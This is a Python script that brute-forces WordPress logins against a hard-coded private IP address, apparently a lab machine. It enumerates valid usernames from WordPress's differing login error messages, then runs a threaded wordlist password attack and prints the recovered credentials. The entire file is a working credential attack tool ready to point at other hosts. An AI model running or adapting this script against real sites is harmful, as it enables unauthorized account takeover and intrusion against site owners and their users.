import random
import string
import threading

import requests

from bs4 import BeautifulSoup
from rich.console import Console

console = Console()

username = ""
password = ""

threads = []
max_threads = 100

user_found = False
pass_found = False

session = requests.Session()
session.cookies["wordpress_test_cookie"] = "WP+Cookie+check"

def do_thread(target, args:tuple=()):
    while True:
        if len(threads) < max_threads:
            thread = threading.Thread(target=target, args=args)
            thread.start()
            threads.append(thread)
            break
        else:
            clear_threads()

def clear_threads():
    for i in threads:
        i.join()
    threads.clear()

def check_user(usernameCheck:str):
    global username, user_found
    if not user_found:
        console.print(f"Checking username: {usernameCheck}", style="cyan")
        user_ok, pass_ok = check(usernameCheck, random_str())
        if user_ok and not user_found:
            username = usernameCheck
            user_found = True
        else:
            console.print(f"Invalid username :( {usernameCheck}", style="red")
        
def check_password(usernameCheck:str, passwordCheck:str):
    global password, pass_found

    if not pass_found:
        console.print(f"Checking password: {usernameCheck}:{passwordCheck}", style="cyan")
        user_ok, pass_ok = check(usernameCheck, passwordCheck)
        if pass_ok and not pass_found:
            password = passwordCheck
            pass_found = True
        else:
            console.print(f"Invalid password :( {passwordCheck}", style="red")
        

def check(username:str, password:str):
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': 'http://172.16.224.131/wp-admin/',
        'testcookie': '1',
    }
    res = session.post("http://172.16.224.131/wp-login.php", data=data)
    #print(session.cookies.get_dict())
    #with open(f"debug/{username}:{password}", "w+") as f:
    #    f.write(res.text)
    
    soup = BeautifulSoup(res.content, "html.parser")
    login_error_div = soup.find("div", attrs={'id':'login_error'})

    if login_error_div:
        if "invalid username" in str(login_error_div).lower():
            return False, False
        elif "the password you entered" in str(login_error_div).lower():
            return True, False
        else:
            return True, True
    else:
        return True, True

def random_str(length:int=12):
    return "".join(random.choices(string.ascii_letters+string.ascii_letters, k=length))

with open('wordlist.txt', 'r') as f:
    wordlist = f.read().splitlines()

if username == "":
    console.print(f"Bruteforcing Username...", style="cyan")
    for i in wordlist:
        if user_found:
            break
        
        do_thread(check_user, args=(i.strip(),))

clear_threads()

if username == "":
    console.print(f"Unable to get username...", style="red")
    exit()
else:
    console.print(f"Found username :3\n{username}", style="green")


if password == "":
    console.print(f"Bruteforcing Password...", style="cyan")
    for i in wordlist:
        if pass_found:
            break

        do_thread(check_password, args=(username,i.strip()))

clear_threads()

if password == "":
    console.print(f"Unable to get password...", style="red")
    exit()
else:
    console.print(f"Found password :3\n{password}", style="green")

console.print(f"Got login data :3\n{username}:{password}", style="green")
